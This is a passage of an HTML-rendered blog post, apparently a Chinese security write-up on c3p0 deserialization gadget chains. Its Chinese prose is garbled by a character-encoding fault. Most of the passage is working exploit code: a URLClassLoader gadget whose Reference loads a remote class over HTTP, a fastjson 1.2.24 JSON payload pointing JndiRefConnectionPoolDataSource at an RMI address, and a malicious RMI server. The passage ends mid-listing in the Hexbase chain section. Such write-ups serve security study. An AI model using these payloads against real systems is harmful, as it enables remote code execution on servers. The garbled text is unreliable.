function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, InvocationTargetException, IllegalAccessException, NoSuchMethodException &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.mchange.v2.naming.ReferenceableUtils&quot;</span>);</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Calc&quot;</span>, <span class="string">&quot;Calc&quot;</span>,<span class="string">&quot;http://127.0.0.1:2333/&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getDeclaredMethod(<span class="string">&quot;referenceToObject&quot;</span>, Reference.class, Name.class, Context.class, Hashtable.class);</span><br><span class="line">        method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> method.invoke(clazz, reference, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> method.invoke(o, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211171517098.png" alt="image-20221117151720065"></p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211171517290.png" alt="image-20221117151745234"></p><p>åœ¨<code>PoolBackedDataSourceBase.readObject</code>ä¸­ï¼Œæƒ³è¦è¿›å…¥é“¾å­ä¸‹ä¸€æ­¥getObject()ï¼Œå¿…é¡»è¦æ»¡è¶³ä¼ å…¥çš„ç±»å¿…é¡»æ˜¯ <code>IndirectlySerialized</code>è¿™ä¸ªç±»ï¼Œæ»¡è¶³æ¡ä»¶åï¼Œè°ƒç”¨<code>getObject()</code>æ–¹æ³•ï¼Œç„¶åå°†è¿”å›çš„ç±»è½¬ä¸º<code>ConnectionPoolDataSource</code>ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (o <span class="keyword">instanceof</span> IndirectlySerialized) o = ((IndirectlySerialized) o).getObject();</span><br><span class="line"><span class="built_in">this</span>.connectionPoolDataSource = (ConnectionPoolDataSource) o;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥å˜æˆäº†<code>ConnectionPoolDataSource</code>å»æ‰§è¡Œ<code>getObject()</code>æ–¹æ³•ï¼Œè·Ÿè¿›</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211171637429.png" alt="image-20221117163731388"></p><p>å¯ä»¥å‘ç°ConnectionPoolDataSourceæ˜¯ä¸€ä¸ªæ¥å£ï¼ŒåŒæ—¶å¹¶æ²¡æœ‰ç»§æ‰¿serializeæ¥å£ï¼Œæ˜¯ä¸èƒ½ç›´æ¥è¢«åºåˆ—åŒ–çš„</p><p>çªç ´ç‚¹æ˜¯åœ¨<code>PoolBackedDataSourceBase.writeObject()</code>ï¼Œå†™ä¸‹äº†åŒ…è£…<code>ConnectionPoolDataSource</code>ç±»çš„å…·ä½“æµç¨‹</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211171651515.png" alt="image-20221117165123481"></p><p>å…ˆå°è¯•å¯¹<code>ConnectionPoolDataSource</code>ç±»è¿›è¡Œåºåˆ—åŒ–æ“ä½œï¼Œåºåˆ—åŒ–å¤±è´¥å°±ç”¨<code>indirector.indirectForm()</code>å¯¹å…¶è¿›è¡ŒåŒ…è£…</p><p>è·Ÿè¿›<code>indirector.indirectForm()</code>ï¼Œè€Œè¿™é‡Œçš„<code>indirector</code>å°±æ˜¯<code>ReferenceIndirector</code></p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211171658561.png" alt="image-20221117165832538"></p><p>æœ€åè¿”å›äº†<code>ReferenceSerialized</code>ç±»</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211171703608.png" alt="image-20221117170330580"></p><p><code>ReferenceSerialized</code>ç±»ç»§æ‰¿äº†ä¸€ä¸ªæ¥å£ï¼Œè·Ÿè¿›å»çœ‹çœ‹</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211171703482.png" alt="image-20221117170355462"></p><p>ç»§æ‰¿äº†<strong>serialize</strong>æ¥å£ï¼Œè‡³æ­¤ï¼ŒåŒ…è£…çš„è¿‡ç¨‹åˆ†æç»“æŸ</p><p>æ‰€ä»¥<code>ConnectionPoolDataSource</code>ç±»ç»è¿‡åºåˆ—åŒ–åï¼Œè¿”å›çš„çš„æœ€ç»ˆæ˜¯<code>ReferenceSerialized</code>ç±»ï¼Œä¹Ÿå°±æ˜¯è¯´<code>ConnectionPoolDataSource</code>å¤–è¡¨ä¸Šè¿˜æ˜¯<code>ConnectionPoolDataSource</code>ï¼Œä½†æ˜¯å®é™…ä¸Šå·²ç»å˜æˆäº†<code>ReferenceSerialized</code>æ‰€ä»¥åœ¨<code>PoolBackedDataSourceBase.readObject</code>ä¸­è°ƒç”¨çš„å…¶å®æ˜¯<code>ReferenceSerialized.getObject()</code>æ–¹æ³•</p><p>å…ˆæ„é€ ä¸€ä¸ªåŒ…å«è¿œç¨‹æ¶æ„ç±»çš„<code>ConnectionPoolDataSource</code>ç±»ï¼Œæœ‰è¶£çš„æ˜¯ï¼šåœ¨<code>Referenceable</code>æ¥å£ä¸­æœ‰ä¸€ä¸ª<code>getReference()</code>æ–¹æ³•å¯ä»¥ç›´æ¥å®ä¾‹åŒ–ä¸€ä¸ª<code>Reference</code>å¯¹è±¡</p><p>é€šè¿‡åå°„ä¿®æ”¹<code>connectionPoolDataSource</code>å±æ€§å€¼ä¸ºæ¶æ„ç±»</p><p><strong>Exp</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Referenceable;</span><br><span class="line"><span class="keyword">import</span> javax.sql.ConnectionPoolDataSource;</span><br><span class="line"><span class="keyword">import</span> javax.sql.PooledConnection;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLFeatureNotSupportedException;</span><br><span class="line"><span class="keyword">import</span> java.util.logging.Logger;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(value = &quot;all&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLClassLoaderGadget</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Badclass</span> <span class="variable">badclass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Badclass</span>();</span><br><span class="line">        <span class="type">PoolBackedDataSourceBase</span> <span class="variable">poolBackedDataSourceBase</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PoolBackedDataSourceBase</span>(<span class="literal">false</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> poolBackedDataSourceBase.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;connectionPoolDataSource&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(poolBackedDataSourceBase, badclass);</span><br><span class="line"></span><br><span class="line">        serialize(poolBackedDataSourceBase);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">oi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> oi.readObject();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Badclass</span> <span class="keyword">implements</span> <span class="title class_">ConnectionPoolDataSource</span>, Referenceable&#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Reference <span class="title function_">getReference</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Calc&quot;</span>,<span class="string">&quot;Calc&quot;</span>,<span class="string">&quot;http://127.0.0.1:2333/&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">(String user, String password)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PrintWriter <span class="title function_">getLogWriter</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLogWriter</span><span class="params">(PrintWriter out)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLoginTimeout</span><span class="params">(<span class="type">int</span> seconds)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getLoginTimeout</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Logger <span class="title function_">getParentLogger</span><span class="params">()</span> <span class="keyword">throws</span> SQLFeatureNotSupportedException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211191204094.png" alt="image-20221119120421032"></p><h3 id="JNDIé“¾"><a href="#JNDIé“¾" class="headerlink" title="JNDIé“¾"></a>JNDIé“¾</h3><h4 id="gadgetæµç¨‹åˆ†æ-1"><a href="#gadgetæµç¨‹åˆ†æ-1" class="headerlink" title="gadgetæµç¨‹åˆ†æ"></a>gadgetæµç¨‹åˆ†æ</h4><p>é“¾å°¾:<code>JndiRefForwardingDataSource.dereference()</code>ä¸­å­˜åœ¨<code>lookup()</code></p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211172221362.png" alt="image-20221117222143312"></p><p><code>lookup()</code>çš„å‚æ•°ä¸º<code>jndiName</code>ï¼Œè·Ÿè¿›çœ‹çœ‹è¿™ä¸ª<code>jndiName</code>æ˜¯å¦å¯æ§ï¼Œ<code>Object jndiName = this.getJndiName();</code></p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211181306113.png" alt="image-20221118130553027"></p><p><code>getJndiName()</code>å¯¹jndiNameè¿›è¡Œäº†ä¸€ä¸ªåˆ¤æ–­ï¼Œå¦‚æœjndiNameä¸ºNameç±»å‹ï¼Œåˆ™è°ƒç”¨<code>jndiName.clone()</code>ï¼Œå¦åˆ™è¿”å›Stringç±»å‹çš„jndiName</p><p>è€Œåœ¨dereference()å‡½æ•°ä¸­æ˜¯å…è®¸ä¼ å…¥Stringç±»å‹çš„å‚æ•°çš„</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211181310834.png" alt="image-20221118131039803"></p><p>è‡³æ­¤ï¼Œå°¾é“¾æ„é€ å®Œæ¯•</p><p>å‘ä¸Šæ‰¾ï¼ŒåŒä¸€ä¸ªç±»ä¸‹çš„<code>innner()</code>æ–¹æ³•ä¸­è°ƒç”¨äº†<code>dereference()</code></p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211181315308.png" alt="image-20221118131526282"></p><p>ç»§ç»­æ‰¾ï¼Œ<code>JndiRefConnectionPoolDataSource</code>ä¸­æœ‰<code>setJndiName()</code>å¯ä»¥è®¾ç½®<code>jndiName</code>çš„å€¼</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211181339667.png" alt="image-20221118133948643"></p><p>è‡³æ­¤ï¼Œåˆ©ç”¨é“¾ç»“æŸ</p><p>(å½“ç„¶ï¼Œå…¶å®åœ¨JndiRefForwardingDataSourceå·²ç»æœ‰éå¸¸å¤šçš„ getter&#x2F;setter æ–¹æ³•ï¼Œæ»¡è¶³ fastjson è°ƒç”¨é“¾çš„æ¡ä»¶äº†ï¼Œå·²ç»å¯ä»¥ç¼–å†™Expäº†ã€‚ä¸ºä»€ä¹ˆè¿˜è¦å¾€ä¸Šæ‰¾ï¼Ÿå› ä¸ºJndiRefForwardingDataSource ç±»æ˜¯ default çš„ç±»ï¼Œåˆ©ç”¨æ¡ä»¶è¿˜æ˜¯æœ‰é™)</p><h4 id="EXPç¼–å†™"><a href="#EXPç¼–å†™" class="headerlink" title="EXPç¼–å†™"></a>EXPç¼–å†™</h4><p>æ­¤æ¡é“¾å­æ˜¯åŸºäºFastjsonæˆ–Jacksonååºåˆ—åŒ–ç¯å¢ƒä¸‹æ¥æ„é€ çš„</p><p>å…ˆå¯¼å…¥fastjsonä¾èµ–</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.24<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>Exp</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JndiGadget</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;JndiName\&quot;:\&quot;rmi://127.0.0.1:1099/hello\&quot;, &quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;LoginTimeout\&quot;:1&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>BadRmi</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BadRmi</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Calc&quot;</span>,<span class="string">&quot;Calc&quot;</span>,<span class="string">&quot;http://127.0.0.1:2333/&quot;</span>);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">refObjWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">        Naming.bind(<span class="string">&quot;rmi://127.0.0.1:1099/shell&quot;</span>,refObjWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211191606046.png" alt="image-20221119160649943"></p><h3 id="Hexbaseé“¾"><a href="#Hexbaseé“¾" class="headerlink" title="Hexbaseé“¾"></a><strong>Hexbase</strong>é“¾</h3><p>è¯¥é“¾èƒ½æˆç«‹çš„åŸå› æ˜¯åœ¨<code>WrapperConnectionPoolDataSource</code>ç±»çš„æ„é€ å‡½æ•°ä¸­ï¼Œèƒ½å¤Ÿååºåˆ—åŒ–ä¸€ä¸²åå…­è¿›åˆ¶å­—ç¬¦ä¸²</p><h4 id="gadgetæµç¨‹åˆ†æ-2"><a href="#gadgetæµç¨‹åˆ†æ-2" class="headerlink" title="gadgetæµç¨‹åˆ†æ"></a>gadgetæµç¨‹åˆ†æ</h4><p>é“¾å°¾<code>WrapperConnectionPoolDataSource.WrapperConnectionPoolDataSource(boolean autoregister)</code></p><p>åœ¨å¯¹å±æ€§<code>userOverrides</code>èµ‹å€¼æ—¶,è°ƒç”¨äº†<code>C3P0ImplUtils.parseUserOverridesAsString()</code></p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211191637209.png" alt="image-20221119163747176"></p><p>è·Ÿè¿›ï¼Œè¯¥æ–¹æ³•ä½œç”¨å°±æ˜¯å°†String ç±»å‹çš„userOverrideååºåˆ—åŒ–ä¸ºå¯¹è±¡ï¼Œå…·ä½“æµç¨‹ä¸ºè¯»å–ä¸€ä¸ªåå…­è¿›åˆ¶å­—ç¬¦ä¸²ï¼Œå°†å…¶è½¬æ¢æˆå­—èŠ‚æµæ•°ç»„ä¿å­˜åœ¨serBytesï¼Œæœ€åå°†è¿™ä¸ªå­—èŠ‚æµæ•°ç»„äº¤ç»™<code>SerializableUtils.fromByteArray()</code>è§£æ</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211191640095.png" alt="image-20221119164059061"></p><p>åœ¨è½¬æ¢è¿‡ç¨‹ä¸­è°ƒç”¨äº†<code>substring()</code>æˆªå»å­—ç¬¦ä¸²å¤´éƒ¨çš„<code>HASM_HEADER</code>åŒæ—¶æˆªå»å­—ç¬¦ä¸²æœ€åä¸€ä½ï¼Œæ‰€ä»¥æ„é€ æ—¶éœ€æ³¨æ„ä¸¤ç‚¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.åœ¨åå…­è¿›åˆ¶å­—ç¬¦ä¸²å¤´éƒ¨åŠ ä¸ŠHASM_HEADER</span><br><span class="line">2.åœ¨ç»“å°¾åŠ ä¸Šä¸€ä¸ª;</span><br></pre></td></tr></table></figure><p>è·Ÿè¿›<code>SerializableUtils.fromByteArray()</code></p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211191651564.png" alt="image-20221119165152534"></p><p>è°ƒç”¨äº†<code>deserializeFromByteArray()</code>ï¼Œæœ€ç»ˆåœ¨<code>deserializeFromByteArray()</code>å®ç°ååºåˆ—åŒ–æ“ä½œ</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211191652899.png" alt="image-20221119165240870"></p><p><strong>Gadget</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">WrapperConnectionPoolDataSource.WrapperConnectionPoolDataSource(boolean autoregister)</span><br><span class="line">C3P0ImplUtils.parseUserOverridesAsString( String userOverridesAsString )</span><br><span class="line">SerializableUtils.fromByteArray(byte[] bytes)</span><br><span class="line">SerializableUtils.deserializeFromByteArray(byte[] bytes)</span><br></pre></td></tr></table></figure><p><strong>Expç¼–å†™</strong></p><p>æ€è·¯å¾ˆç®€å•ï¼Œç”±äºæ­¤é“¾æ˜¯å°†ä¼ å…¥çš„åå…­è¿›åˆ¶å­—ç¬¦ä¸²è¿›è¡Œååºåˆ—åŒ–ï¼ŒåŒæ—¶é“¾å­çš„ç¬¬ä¸€æ­¥ä¼ å…¥çš„å‚æ•°æ˜¯ <code>this.getUserOverridesAsString()</code>ï¼Œæ‰€ä»¥ç»“åˆfastjsonçš„é“¾å­å¾ˆå¥½æ‰“</p><p>ç»“åˆCC1(å…¶ä»–é“¾å­éƒ½æ˜¯å¯ä»¥çš„ï¼Œåªè¦æœ‰ç›¸åº”çš„ä¾èµ–)</p><p>å¯¼å…¥ä¾èµ–</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.24<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>Exp</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span 